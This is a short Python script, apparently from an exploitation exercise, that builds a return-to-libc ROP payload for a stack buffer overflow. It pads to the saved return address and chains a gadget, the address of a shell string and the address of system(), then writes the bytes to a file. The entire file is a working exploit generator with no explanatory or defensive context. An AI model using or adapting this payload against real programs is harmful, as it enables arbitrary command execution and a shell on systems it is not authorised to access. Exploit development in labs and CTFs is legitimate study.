#!/usr/bin/env python3
import struct

buffer_addr = 0x7fffffffe1b0
rip_addr = 0x7fffffffe1f8
libc_base_addr = 0x7ffff7d81000
rop_gadget_offset = 0x000000000002a3e5
rop_gadget_addr = libc_base_addr + rop_gadget_offset
shell_str_addr = 0x7ffff7f59678
system_addr = 0x7ffff7dd1d70

payload = b"A" * (rip_addr - buffer_addr)
payload += struct.pack("<Q", rop_gadget_addr)
payload += struct.pack("<Q", shell_str_addr)
payload += struct.pack("<Q", system_addr)

with open("rop-payload.bin", "wb") as f:
    f.write(payload)
    